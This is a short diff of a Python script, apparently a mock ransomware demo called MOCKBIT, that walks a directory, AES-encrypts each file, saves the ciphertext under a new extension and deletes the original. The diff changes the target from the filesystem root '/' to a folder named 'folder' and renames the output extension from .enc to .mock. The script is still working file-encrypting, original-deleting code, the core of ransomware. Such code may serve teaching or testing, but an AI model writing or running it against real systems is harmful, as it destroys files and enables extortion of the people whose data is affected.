@@ -4,7 +4,7 @@ from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
 
 # Zielordner anpassen!
-START_PATH = "/"
+START_PATH = "folder"
 KEY_FILENAME = "MOCKBIT_KEY.txt"
 
 def pad(data):
@@ -16,7 +16,7 @@ def encrypt_file(file_path, key):
         data = f.read()
     cipher = AES.new(key, AES.MODE_CBC)
     ct_bytes = cipher.encrypt(pad(data))
-    with open(file_path + ".enc", "wb") as f:
+    with open(file_path + ".mock", "wb") as f:
         f.write(cipher.iv + ct_bytes)
     os.remove(file_path)
 
@@ -24,7 +24,7 @@ def find_and_encrypt_all_files(path, key):
     for dirpath, _, files in os.walk(path):
         for name in files:
             file_path = os.path.join(dirpath, name)
-            if name.endswith(".enc") or name == KEY_FILENAME:
+            if name.endswith(".mock") or name == KEY_FILENAME:
                 continue
             try:
                 encrypt_file(file_path, key)
